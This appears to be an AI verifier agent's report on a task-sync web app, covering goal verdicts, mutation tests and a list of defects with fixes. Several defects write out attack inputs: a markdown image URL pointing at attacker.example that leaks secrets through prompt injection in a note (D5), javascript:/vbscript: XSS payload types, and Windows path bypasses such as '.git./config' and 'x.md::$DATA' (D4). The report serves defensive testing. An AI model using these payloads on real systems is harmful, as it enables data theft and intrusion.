# Round 3 — Independent verification, round 1 (VERIFY-1)

Verifier: separate agent with fresh context, branch `feature/round3` @ 6331072 (2026-11-11). No Docker, no external APIs, local temp repos only. Report saved verbatim (lightly reformatted); fixes are tracked in `docs/BUGS.md` (B-33…B-43) and `VERIFY-2.md`.

**Overall: NOT yet passed** — 2 high defects (D1, D2), five goals PARTIAL.
Suites: fast suite 415 passed; `tests/acceptance/test_round3.py` incl. e2e 83 passed, 0 xfail, 0 skip.

## Verdict per goal
| Goal | Verdict | Evidence |
|---|---|---|
| G-A1 | PASS | 17 extra payloads (markdown-image `javascript:`, `data:`, entity/tab-obfuscated `javascript:`, autolinks, `vbscript:`, wiki-link/callout injection, `ontoggle`) — none executed, no `on*`/`javascript:` left. See D5 (external images). |
| G-A2 / G-A3 | PASS | a2/a3 tests green |
| G-A4 | PASS | only `logs/.gitkeep` tracked, size rotation |
| G-C1 | PASS | TASKS_FORMAT.md, `new_tasks_note` |
| G-C2 | PARTIAL | lossless round trip (M7 caught), but duplicate IDs are fixed only on write; reads already wrong (D2) |
| G-C3 | PARTIAL | retry/re-apply real (M3, M4 caught); `safe_path` case-sensitive + Windows trailing-dot bypass (D4) |
| G-C4 | PARTIAL | cache rebuild loses tasks on duplicate IDs (D2) |
| G-C5 | PASS | outbox order enforced (M5 caught) |
| G-C6 | PASS | |
| G-C7 | PARTIAL | tasks with a non-allowed tag cannot be edited (D3); CSRF 403 on all 4 task endpoints; foreign task id → 404 |
| G-B1 | PARTIAL | `.dockerignore` not effective in subfolders (D6); heavy scheduler (D7) |
| G-B2 | PARTIAL | restore/rollback incorrect (D1, D8) |
| G-B3 | PASS | |
| G-B4 | PASS (honest limitation) | `compose config`, `bash -n`, shellcheck; nothing live |

## Mutation checks
| # | Mutation | Tests that failed | Caught? |
|---|---|---|---|
| M1 | `safe_path`: remove the `..` check | none | NO — redundant with the resolve check, never tested alone |
| M2 | `safe_path`: remove `relative_to` (symlink escape) | `test_c3_symlink_escape_rejected` | yes |
| M3 | `vault_apply`: no retry on rejected push | `test_c3_concurrent_push…`, `test_c3_two_writers_in_parallel` | yes |
| M4 | retry without fresh pull | same 2 | yes |
| M5 | outbox flushed newest-first | `test_c5_…queued_and_flushed_in_order` | yes |
| M6 | `render` drops `extra` | unit `test_render_keeps_original_priority_emoji_and_unknown_fields` | yes |
| M7 | `serialize` strips trailing spaces | hypothesis round trip, `test_roundtrip_edge_inputs` | yes |
| M8 | healthz: drop `SELECT 1` | none | NO — test mocks `cursor()` raising |
| M9 | SECRET_KEY guard disabled | `test_b1_insecure_secret_key_refused…` ×2 | yes |
| M10 | markdown.js without DOMPurify | `test_a1_markdown_is_sanitized[javascript:]` | yes |
| M11 | markdown.js without the `renderer.html` override | none | NO — DOMPurify still blocks payloads, D20 "raw HTML as text" untested |

## Defects (by severity)
- **D1 High — restoring an older dump breaks the documented migration.** `install.sh` migrates to 0010, then `restore.sh` loads a `pg_dump --clean --if-exists` dump at 0009: `--clean` only drops objects in the dump; `core_vaultoutbox` (FK to `auth_user`) remains → `DROP TABLE auth_user` fails, `ON_ERROR_STOP` aborts, DB half-dropped (no `--single-transaction`); otherwise `migrate` hits "relation core_vaultoutbox already exists". Fix: `DROP SCHEMA public CASCADE; CREATE SCHEMA public;` before loading, `psql --single-transaction`, test.
- **D2 High — duplicate 🆔 hides a task and edits the wrong one.** `_cache_from_note` keys by `vault_id`: two lines with the same ID collapse into one row; `apply_op` → `by_id` targets the first line. Repro: in Obsidian copy a line / set `- [ ] Дубликат 🆔 t7k2m9`, sync twice → only "Дубликат" visible; mark done → the note gets `- [x] Сдать лабу по физике … ✅`. Fix: detect duplicates on read (ensure_ids write or line identity) + regression test.
- **D3 Medium — tasks with a non-allowed tag cannot be edited.** The dialog sends all fields; `update_task` validates tags before comparing → `- [ ] X #work` → any edit 400 "Тег «work» не разрешён"; `[[#Heading]]` parsed as tag `Heading`. Fix: validate only newly added tags; ignore `#` inside `[[…]]`.
- **D4 Medium — `safe_path` bypass (Windows; matters for the Round 4 editor).** Case-sensitive `FORBIDDEN_PARTS`, no Win32 trailing dot/space normalisation: `.GIT/config`, `.git./config`, `.obsidian./x.md`, `.Obsidian/workspace.json` accepted; `tasks_note_path=".GIT/x.md"` wrote into `.git\x.md`. `CON`, `x.md::$DATA`, `x.md.` accepted. Fix: casefold + rstrip(" ."), check resolved parts, reject reserved names, `:`, trailing dots/spaces.
- **D5 Medium — external images load in AI answers.** `![t](https://attacker.example/leak?q=SECRET)` rendered and fetched → exfiltration via prompt injection in a note. Fix: drop external `<img>` (link only) or CSP `img-src 'self' data:`.
- **D6 Medium — `.dockerignore` root-only patterns.** `*.sqlite3`, `*.pyc` don't match `ai_manager/db.sqlite3`, `audit_copy_db.sqlite3`, `.coverage` → real data in the image when built on the dev PC. Fix `**/…`; test what is actually excluded.
- **D7 Medium — scheduler imports torch every minute.** `vault_writer._user_repo` imports `core.rag_engine` (6.7 s, torch + llama_index) and the scheduler starts a new `manage.py sync_tasks` every 60 s. Fix: light module for `get_user_paths` or one long-lived loop.
- **D8 Low/Medium — `update.sh` "already up to date" after a failed build.** `set -e` exits after `git pull` moved HEAD; next run sees no change while the old image runs. Fix: `trap … ERR` resetting to `$previous`, or store the deployed commit.
- **D9 Low — parser edge cases:** deleting a parent leaves its sub-tasks as a 4-space block (code block); ```` ```` ```` fence containing ```` ``` ```` → inner task parsed; a `# comment` in frontmatter becomes a section; protected-branch rejection classified as `conflict` (retried 4×, misleading message).
- **D10 Low — `.env.example` WEB_BIND** claims LAN access works; with SSL redirect/secure cookies/ALLOWED_HOSTS it doesn't over http; Docker-published ports bypass ufw.
- **D11 Low — image hardening:** code `--chown=app` (writable by the app user), tests shipped, `cloudflared:latest` unpinned.

## Spec gaps
- C8 (test matrix) not a separate goal (spread over C3/C5/C7 — acceptable, not stated).
- 0.5.4 coverage ≥ 90 % not in GOALS / not reported.
- C1 "unknown fields not lost" only unit-tested.
- D20 "raw HTML shown as text" untested (M11). healthz test can't distinguish connect from answer (M8).

## Doc inaccuracies
- D22 / GOALS C2 "duplicate IDs fixed" — only after a write (D2).
- DEPLOY §7/§8 "restore replaces the database" — not across schema versions (D1).
- `.env.example` WEB_BIND LAN claim (D10). DEPLOY §11 should say `.dockerignore` effectiveness was not verified.

Git status: verifier's mutations restored; no changes of its own left.
